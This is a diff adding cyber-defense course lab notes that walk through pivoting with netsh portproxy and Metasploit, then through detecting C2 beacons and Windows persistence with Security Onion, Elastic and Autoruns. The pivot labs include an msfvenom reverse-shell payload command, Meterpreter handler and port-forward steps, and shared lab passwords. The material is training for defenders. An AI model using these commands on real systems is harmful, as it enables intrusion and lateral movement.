@@ -2899,6 +2899,787 @@ Through the use and analysis of Elastic Stack and Kibana, an outlier data point 
 
 -----------------------------------------------
 
+####### CDAH-M8L2-Pivoting #######
+
+
+Workflow
+
+
+1. Log in to the Virtual Machine (VM) ch-tech-1 using the following credentials:
+Username: trainee
+Password: CyberTraining1!
+
+ 
+2. Use an Administrator command prompt to run the following command:
+C:\Windows\system32>ipconfig
+
+![image](https://github.com/user-attachments/assets/7398baa1-e16e-40a3-8209-04dcba23ba00)
+
+ 
+The output confirms ch-tech-1 has a connection to the network 172.35.13.0/24 and the network 10.10.0.0/16. 
+ 
+3. Create a portproxy listening on port 1337 by running the following command:
+C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=1337 connectport=8000 connectaddress=10.10.13.4
+
+
+
+With this command, data can be sent and received over port 1337 from the compromised host 10.10.13.4 on port 8000. 
+ 
+4. To verify the portproxy is listening as expected, run the following command:
+C:\Windows\system32>netsh interface portproxy show v4tov4
+
+ 
+The command v4tov4 is a functionality of netsh that maps a port and IPv4 address to send messages received after establishing a separate TCP connection.
+ 
+Figure 8.2-8 displays the returned output, which confirms the ch-tech-1 is listening on port 1337 and communicating to receive data from 10.10.13.4 on port 8000. 
+
+![image](https://github.com/user-attachments/assets/e07b6f3b-c23b-42f7-8aec-cc2a9302b71c)
+
+5. Open PowerShell as an Administrator. 
+ 
+An artifact of the portproxy method is the configuration information stored in the host's registry. To detect the existence or persistence of portproxy configurations, analyze the registry key as described in the next step. 
+ 
+6. Detect persistent portproxy configurations by running the following cmdlet within the PowerShell window: 
+PS C:\Windows\system32> Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp
+
+The command retrieves properties of a specified item on a defined path. In this instance, PowerShell iterates through the defined registry path for any occurrences of the service portproxy using v4tov4 over TCP. 
+ 
+Figure 8.2-9 displays the returned output, which displays the existence of the portproxy in the registry, utilizing port 1337, communicating with the IP address 10.10.13.4 on port 8000. 
+
+![image](https://github.com/user-attachments/assets/1ab50da4-5c4e-49f3-94f3-5c908dab6235)
+
+7. Log in to the VM ch-tech-3 using the following credentials:
+Username: trainee
+Password: CyberTraining1!
+
+ 
+8. Open PowerShell.
+ 
+9. Create a simple Hypertext Transfer Protocol (HTTP) web server using the exploited machine ch-tech-3 as a host by entering the following command in PowerShell:
+PS C:\Users\trainee> python -m http.server 8000
+
+ 
+According to the output, the server is located at http://0.0.0.0:8000/. 
+ 
+10. Log in to the VM red-kali using the following credentials:
+Username: trainee
+Password: CyberTraining1!
+
+ 
+11. Open Terminal and enter the following commands to retrieve the file test.txt by using the portproxy pivot:
+(trainee@red-kali)-[~] $ wget http://172.35.13.2:1337/Desktop/test.txt
+(trainee@red-kali)-[~] $ cat test.txt
+
+
+
+Figure 8.2-10 displays the returned output, which shows that the file was retrieved. 
+
+![image](https://github.com/user-attachments/assets/0bd0e5e0-e248-47d5-b336-20c3b80755b3)
+
+The commands from the last step connected to the workstation ch-tech-1 at 10.10.13.2, on port 1337. The workstation ch-tech-1 forwards the communication to ch-tech-3 on port 8000 to access and return the file requested. This is a simple example of how pivoting works i n a network. A simple portproxy is set up on an initially compr omised host ch-tech-1 to listen for data from another compromised host ch-tech-3. The workstation ch-tech-3 did not have connectivity to the attacker host red-kali. However, with netsh and portproxy, pivoting was able to deliver the file test.txt from the workstation ch-tech-3 to the host red-kali. 
+
+--------------------------------------------------------------
+
+Pivot Using Metasploit
+Walk through pivoting using Metasploit with the following lab. Create a Meterpreter port forward to access a remote desktop through a pivot host.
+
+﻿
+
+Workflow
+﻿
+
+1. Log in to the VM red-kali using the following credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. Open Terminal.
+
+﻿
+
+3. Within Terminal, run the following Nmap scan:
+
+(trainee@red-kali)-[~] $ sudo nmap -sn 172.35.13.0/24
+[sudo] password for trainee: CyberTraining1!
+﻿
+
+NOTE: The scan takes 1–2 minutes to complete. 
+
+﻿
+
+Figure 8.2-11 displays the scan results. The ping-only scan returns three hosts, providing little information about the network. 
+
+﻿![image](https://github.com/user-attachments/assets/48c428d3-8681-409a-8713-8d6c15fd77b3)
+
+Scanning for hosts in a network from an external position is normally not possible. These scans may not always return useful data due to firewall rules. Access the network through a simulated exploit and conduct a scan after accessing a machine used to pivot. 
+
+
+4. From the desktop, select Applications.
+
+
+5. Use the Search bar to search for and select Metasploit framework. 
+
+
+NOTE: If prompted, enter the password CyberTraining1! for the user trainee.
+
+
+6. Within the Metasploit session, enter the following series of commands:
+msf6 > use exploit/multi/handler
+msf6 exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(handler) > set LHOST 128.0.7.205
+msf6 exploit(handler) > set LPORT 4444
+msf6 exploit(handler) > set ExitOnSession false
+msf6 exploit(handler) > exploit -j
+
+
+
+Figure 8.2-12 displays the Metasploit session after running the previous commands:
+
+![image](https://github.com/user-attachments/assets/2a4381f6-ab0c-43ea-b368-8d6c49deaf4f)
+
+These commands open a listener on the attacker VM with IP address 128.0.7.205 on port 4444, to “catch” a reverse shell callback from a remote payload. 
+
+
+7. Log in to the VM ch-tech-1 using the following credentials:
+Username: trainee
+Password: CyberTraining1!
+
+
+
+8. Open the folder Executable on the desktop.
+
+
+The folder Executable contains a malicious executable (.exe) file titled test.exe. 
+
+
+9. Run test.exe to establish a reverse TCP shell between the target ch-tech-1 and the attacker host red-kali.
+
+
+The executable, test.exe, is a malicious payload that simulates a user-executed exploit. This type of payload is created using msfvenom with the following command: 
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=128.0.7.205 LPORT=4444 --platform win -a x86 -f exe -o test.exe -e x86/ -i8
+
+
+
+10. Return to the red-kali VM and access the already established Metasploit session. 
+
+
+Figure 8.2-13 displays the output after opening the payload test.exe. Meterpreter session 1 opens between the attacker host at IP 128.0.7.205:4444 and the target host at IP 172.35.13.2. 
+
+![image](https://github.com/user-attachments/assets/fa267bd0-841b-4e26-8fc6-ad984ef41da3)
+
+Opening the Meterpreter session 1 allows it to be used for accessing and running commands on the target host. 
+
+
+11. Within the Metasploit session, enter the following command:
+msf6 exploit(multi/handler) > sessions
+
+
+
+The output, as displayed in Figure 8.2-14, defines the Operating System (OS), account information, IP addresses, and ports. 
+
+![image](https://github.com/user-attachments/assets/094063e4-9e21-48c8-80b3-6617e79b3ca5)
+
+12. Enter the following command to open a Meterpreter session with the target host:
+msf6 exploit(multi/handler) > sessions -i <session number>
+
+
+
+NOTE: A session number different than the screenshot in step 10 may be displayed during this workflow. 
+
+
+Meterpreter is an attack payload that provides an interactive shell for remotely analyzing and exploring the target machine. After establishing a Meterpreter session, the remainder of the lab focuses on how attackers use Meterpreter to pivot within the exploited network. 
+
+
+13. Within the Meterpreter session, run the following command to display information about the exploited machine:
+meterpreter > ipconfig
+
+
+
+Figure 8.2-15 displays that the target machine has the following three interfaces:
+Interface 1: 127.0.0.1
+Interface 2: 10.10.13.2
+Interface 3: 172.35.13.2
+
+![image](https://github.com/user-attachments/assets/21202717-1ae3-44f4-bf13-9bd67aa838b3)
+
+14. Perform an Address Resolution Protocol (ARP) scan for the given IP range in the Meterpreter session by running the following command with the arp_scanner function:
+meterpreter > run arp_scanner -r 10.10.13.0/24
+
+
+
+ARP presents a table of the documentation and organization of each host's Media Access Control (MAC) address and corresponding IP address. The arp_scanner function within Meterpreter network scanning takes time and leaves the VM red-kali open for 5–10 minutes to display a portion of the results returned from the scan. 
+
+![image](https://github.com/user-attachments/assets/aba4e7f6-5bab-4a1b-8239-eb3b356bc5e5)
+
+15. Create a port forward to 10.10.13.4 on the Windows Remote Desktop Protocol (RDP) port 3389:
+meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.13.4
+
+
+
+The command includes the following elements to establish port forwarding on the pivot host:
+add adds the port forwarding to the list.
+-l 3389 is the local port that listens and forwards to the target.
+-p 3389 is the destination port on the target host.
+-r 10.10.13.4 is the targeted system’s IP address or hostname.
+
+NOTE: For the next step, keep Metasploit and Meterpreter active.
+
+
+16. Use the original terminal or a new terminal to enter the following command:
+(trainee@red-kali)-[~] $ netstat -antp
+
+
+
+The results, as displayed in Figure 8.2-17, indicate that 0.0.0.0 is listening on port 3389 in addition to the pivot host on port 4444.
+
+![image](https://github.com/user-attachments/assets/adef1ab1-3758-47c0-b7f7-db122ffe86b3)
+
+17. In a terminal window separate from Meterpreter, enter the following command to connect to the Windows host 10.10.13.4 over RDP and enter YES at the certificate prompt:
+(trainee@red-kali)-[~] $ rdesktop -d vcch -u trainee -p "CyberTraining1!" 127.0.0.1:3389
+
+
+
+This sequence of port forwards allows the attacker to gain access to the remote host over a forwarded RDP connection.
+
+-------------------------------
+
+##### CDAH-M8L3 C2 Frameworks #####
+
+Detecting Popular C2 Frameworks
+Detect Popular C2 Frameworks
+﻿
+
+This task walks through using Security Onion (SO) and Elastic Stack to perform network analysis in an effort to discover and identify C2 communications. 
+
+﻿
+
+Workflow
+
+﻿
+
+1. Log in to the win-hunt Virtual Machine (VM) using the following credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. Open Google Chrome.
+
+﻿
+
+3. Within Google Chrome, select the Security Onion - Home - Elastic bookmark.
+
+﻿
+
+4. Open Security Onion with the following credentials:
+
+Username: trainee@jdmss.lan
+Password: CyberTraining1!
+﻿
+
+5. The Security Onion - Home dashboard covering the Virtual City City Hall (VCCH) workstations (applying a filter to remove the Domain Controller) over the timespan November 23, 2021 @ 11:30:00.000 - November 23, 2021 @ 12:30:00.000 is shown in Figure 8.3-1:
+
+﻿
+
+﻿
+
+Figure 8.3-1
+
+﻿
+
+The number of machines reporting to the Security Information Event Management (SIEM) in the Security Onion - Log Count by Node module is shown in Figure 8.3-2:
+
+﻿
+
+﻿
+
+Figure 8.3-2
+
+﻿
+
+Within a 3-hour time span, the SIEM collected thousands of logs from numerous machines on the VCCH network. The large number of logs collected makes detecting suspicious activity or communication a difficult task.
+
+﻿
+
+The visualization chart of logs collected, as shown in the Security Onion - Logs Over Time module: 
+
+﻿
+
+﻿
+
+Figure 8.3-3
+
+﻿
+
+A key artifact that is often left within C2 communications is consistent, trackable data calls between hosts. The visualization shows that within the defined time span there is no consistent pattern of communication. The chart shows spikes in traffic and logs collected randomly, according to how the logs are collected. The volume and inconsistency of logs across the network make determining good communications from bad communications a difficult task. 
+
+﻿
+
+6. Select the three-line menu.
+
+﻿
+
+7. Select Visualize Library.
+
+﻿
+
+8. Select Create Visualization.
+
+﻿
+
+9. Within the new visualization window, select Aggregation based.
+
+﻿
+
+10. Select Data Table.
+
+﻿
+
+11. In the New Line/Choose dialog box, select *:so-*.
+
+﻿
+
+12. Set the time span for the data table to November 23, 2021 11:30:00.000 - November 23, 2021 @ 12:30:00.000.
+
+﻿
+
+13. Add a bucket using split rows, with the following information:
+
+Aggregation: Terms
+
+Field: agent.hostname.keyword
+
+Metric: Count
+
+Order: Descending 
+
+Size: 100
+
+14. Add another bucket using split rows, with the following information:
+
+Aggregation: Terms
+
+Field: destination.ip
+
+Metric: Count
+
+Order: Descending 
+
+Size: 100
+
+The output shown in the image below is added to the data table. Select the Count column to sort the table in descending order. 
+
+﻿
+
+While there are no suspicious or outlier IP addresses in this table currently, during an investigation this table is an appropriate first step in discovering C2 communications. A suspicious or outlier IP address is an IP address that is not in the same domain and does not follow the same octet numbers. 
+
+﻿
+
+﻿
+
+Figure 8.3-4
+
+﻿
+
+15. Select the three-line menu.
+
+﻿
+
+16. Select Discover.
+
+﻿
+
+17. Set the time span to November 23, 2021 @ 11:30:00.000 - 12:30:00.000. The following output is displayed:
+
+﻿
+
+﻿
+
+Figure 8.3-5
+
+﻿
+
+18. Select + Add Filter and enter the following filter: 
+
+agent.hostname is CH-TECH-2
+﻿
+
+19. Select Update.
+
+﻿
+
+This query filters to only display logs from the CH-TECH-2 workstation during the hour time span, as shown below:
+
+﻿
+
+﻿
+
+Figure 8.3-6
+
+﻿
+
+20. Enter another filter in the search bar: 
+
+destination.ip: 172.35.13.3
+﻿
+
+21. Select Refresh.
+
+﻿
+
+This query adds another filter to the data, displaying only logs that went to the IP address 172.35.13.3 from the CH-TECH-2 workstation during the hour time span. 
+
+﻿
+
+Once a suspicious or outlier IP address has been discovered it is useful to see a visualization. The visualization below shows consistent communications between CH-TECH-2 and IP address 172.35.13.3, by way of green bars on the bar chart. The communications occur on a consistent interval of 5 minutes (or 300 seconds), which is a telltale sign of C2 communications by way of a C2 beacon.
+
+﻿
+
+﻿
+
+Figure 8.3-7
+
+﻿
+
+The adversary can steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command-and-control communications, as described in technique T1041 using the MITRE ATT&CK® framework. 
+
+﻿
+
+22. Select the arrow next to the date, as shown below:
+
+﻿
+
+﻿
+
+Figure 8.3-8
+
+﻿
+
+Review the data collected within the log file. The key information collected includes the data listed below:
+
+event.module : sysmon 
+
+The log file was collected using sysmon.
+
+event.code : 3
+
+The log file includes sysmon event ID 3. Sysmon event ID 3 is logged when a TCP/UDP connection is made. 
+
+process.name : powershell.exe
+
+The process.name field includes the name of the process that was used to create the event. 
+
+related.user : james.lopez
+
+The related.user name field includes the username that created the event. 
+
+----------------------------------
+
+Detection Analysis
+The VCCH network owner has requested analysis of their network to determine if there is an adversarial presence maintaining communications from an exploited host. VCCH has requested a review of data collected from November 24, 2021, specifically between 11:30:00.000 and 13:00:00.000. 
+
+﻿
+
+Workflow
+
+﻿
+
+1. Open the win-hunt VM using the following credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. Open Security Onion and Elastic Stack using the following credentials:
+
+Username: trainee@jdmss.lan
+Password: CyberTraining1!
+﻿
+
+3. Select the Security Onion - Home dashboard bookmark, and create a Data Table to aid in the investigation of the questionable network activity. Set the time span in Elastic to November 24, 2021 @ 11:30:00.000 to 13:00:00.000.
+
+﻿
+
+The VCCH utilizes two networks, 172.35/16 and 10.10/16, for daily operations. Reminder, 127.0.0.1 is localhost for the network, the IP address that appears in logs and visualizations. 
+
+﻿
+
+NOTE: Remove any filters for the domain controller.
+
+----------------------------------------
+
+Event Modules
+Sysmon events lead the log count over the 90-minute time span. Sysmon events help to identify and provide detailed information about process creations, network connections, and changes to file creation time.
+
+﻿
+
+﻿![image](https://github.com/user-attachments/assets/5e968f97-90ef-4b46-855f-080ca574656d)
+
+
+Figure 8.3-9
+
+﻿
+
+Create a Data Table
+﻿
+
+Create a data table to identify destination IP addresses across the network. The table includes the hostname and the destination IP addresses. 
+
+------------------------------
+
+Suspicious IP Address
+The IP address 128.0.7.205 is an outlier and needs to be investigated. It does not match any of the other IP addresses in the table. Within the 90-minute time span, the IP address was contacted 18 times. Remember that this is a relatively small sample of all of the network traffic.
+
+![image](https://github.com/user-attachments/assets/b5a9d423-cc7a-4896-a3ec-ac979443f25f)
+
+
+---------------------------------
+
+##### CDAH-M8L4-Persisting in Windows Artifacts #####
+
+Detecting Windows Persistence Using Autoruns
+The CPT is assigned a mission to hunt for and remove malware from infected machines. The malware was found and removed, but it keeps coming back. Check the machine for persistence methods that the malware is using.
+
+﻿
+
+Workflow
+
+﻿
+
+1. Log in to the ch-tech-1 Virtual Machine (VM) using the following credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. From the desktop, open Autoruns64.
+
+﻿
+
+Autoruns is part of the Sysinternals suite of tools built by Microsoft. Once opened it scans the system and lists all the known persistence locations which greatly speeds up the time it takes for an analyst to perform a hunt on an infected system for persistence.
+
+﻿
+
+Near the top of the Autoruns window, there are tabs for each area of persistence that occurs.
+
+﻿![image](https://github.com/user-attachments/assets/2b2f1e13-f474-4b28-9614-f8e8db737976)
+
+
+
+
+Observe the two suspicious entries pointing to C:\persistence.bat.
+
+
+These entries are considered suspicious for the following reasons:
+The publisher is not verified. (The digital signature is not trusted by the system or it has no digital signature at all.)
+It is uncommon for a batch script to run directly from C:\.
+There is no description.
+The HKCU\Environment\UserInitMprLogonScript location does not exist by default. It has to be created.
+
+These indicators on their own are not necessarily suspicious. However, when combined it raises the likelihood that it is infected.
+
+
+Adversaries often attempt to blend in with legitimate services and files. This makes it vital to be aware of what is considered normal activity on a system in the environment. Knowing what is normal makes it more obvious to pick out suspicious activity.
+
+
+4. Select the Scheduled Tasks tab.
+
+
+![image](https://github.com/user-attachments/assets/fca817c3-c29d-428c-846f-45b698faed02)
+
+
+
+The persistence.bat script is also being started from a scheduled task. During operational use of Autoruns, this also provides insights on the files from VirusTotal. This is helpful to quickly identify known malicious files. Because this lab environment does not contain the internet, Autoruns is unable to reach VirusTotal to pull that additional information.
+
+
+5. Explore the other tabs and become familiar with additional persistence locations.
+
+
+In this scenario, there are three persistence methods that would need to be remediated.
+
+![image](https://github.com/user-attachments/assets/413b4052-f9b8-4660-9446-59ebd9552fa2)
+
+![image](https://github.com/user-attachments/assets/85cb7985-b888-43cd-b258-f41dd16b7177)
+
+---------------------
+
+Detecting Windows Persistence Using a SIEM
+The Cyber Protection Team (CPT) is assigned a mission to hunt for Windows persistence methods. Direct access to the machines is not possible so they need to use Security Onion.
+
+﻿
+
+Workflow
+
+﻿
+
+1. Log in to the win-hunt VM using the following credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. Open Chrome.
+
+﻿
+
+3. Select the Discover - Elastic bookmark.
+
+﻿
+
+4. Log in to Security Onion using the following credentials:
+
+Username: trainee@jdmss.lan
+Password: CyberTraining1!
+﻿
+
+5. Run a search over the given time range Dec 6, 2021 @ 17:00:00.000 → Dec 6, 2021 @ 18:00:00.000.
+
+﻿
+
+There are more than 129,000 events, which is too many to manually sift through.
+
+﻿![image](https://github.com/user-attachments/assets/cfd1d68c-03a2-4774-85d4-64ddcc2dd027)
+
+6. Narrow the results by searching for Sysmon registry events 12, 13, or 14.
+event.code: (12 OR 13 OR 14)
+
+
+
+There are now more than 2,000 events, which is still too many to analyze one by one.
+
+![image](https://github.com/user-attachments/assets/18f59e82-9cb6-492c-8867-ac95e22707cb)
+
+7. There are several registry keys that have the word Run in their paths. Try searching for all events where registry.path has the word Run in it.
+event.code: (12 OR 13 OR 14) AND registry.path: Run
+
+![image](https://github.com/user-attachments/assets/fc0e284c-f893-4a5d-a3aa-7c26d430a707)
+
+
+
+8. Make the events more readable by adding the following fields:
+host.name
+winlog.user.identifier
+event.code
+event.action
+registry.path
+winlog.event_data.Details
+winlog.event_data.EventType
+
+![image](https://github.com/user-attachments/assets/4249e192-65a7-4f0c-a577-d25d6ee9bcca)
+
+
+
+This looks like suspicious activity. It is rare that a legitimate file runs directly from the root of C:\. This file location needs to be investigated and reported.
+
+
+9. Check for additional persistence activity using the logon script method.
+event.code: (12 OR 13 OR 14) AND registry.path: UserInitMprLogonScript
+
+![image](https://github.com/user-attachments/assets/9056ceb2-1fcf-4b70-a2bd-1174d6264d92)
+
+The adversary is also using the user logon script method as an additional persistence method. This registry location would also need to be remediated. Two forms of persistence were found on ch-dev-1, a common registry run key and a logon script.
+
+![image](https://github.com/user-attachments/assets/5fd66237-8192-40e0-a7ff-e637c2852ee3)
+
+
+
+------------------------------------
+
+Challenge: Detecting Windows Persistence
+This challenge is a capture-the-flag scenario meant to put the knowledge gained from this lesson to the test.
+
+﻿
+
+The ch-treasr-1 host has been loaded with seven persistence methods. Both Security Onion and direct access to ch-treasr-1 are required to hunt down the persistence methods. Not all of the persistence methods can be found by only hunting in Security Onion or only manually hunting on ch-treasr-1. Observe and take note of the files being executed as well as the location. The flags are Universally Unique Identifiers (UUID) and are located in the files being executed by the persistence. To view a flag, open a command prompt and use the type command. In the following example, the file output is the flag named malware and is located in C:\Downloads.
+
+type C:\Downloads\malware
+﻿
+
+The flags look like this: 1FAD2399-DF1F-4C0D-A6C0-4266B725BC5B.
+
+﻿
+
+NOTE: The group of Knowledge Checks that follow this task refers to the challenge, and asks in which persistence method each file and UUID were found. This requires you to take detailed notes. 
+
+﻿
+
+Workflow
+
+﻿
+
+1. Log in to the ch-treasr-1 VM using the following credentials.
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. Log in to the win-hunt VM using the following credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+3. Open Chrome.
+
+﻿
+
+4. Select the Discover - Elastic bookmark. The time range for this challenge is Dec 21, 2021 @ 00:00:00.000 -> Dec 21, 2021 @ 23:30:00.000.
+
+﻿
+
+5. Log in to Security Onion using the following credentials:
+
+Username: trainee@jdmss.lan
+Password: CyberTraining1!
+﻿
+
+Once logged into Security Onion and ch-treasr-1, the challenge begins.
+
+﻿
+
+Make notes on what persistence methods are used and which file and UUID were found in the persistence locations. This information is needed to answer the Knowledge Checks that follow.
+
+-------------------------------
+
+![image](https://github.com/user-attachments/assets/173b0948-1cff-4969-b547-92e655d85f8c)
+
+![image](https://github.com/user-attachments/assets/e64731a5-40ab-48df-9956-5d5f7d1b9b35)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
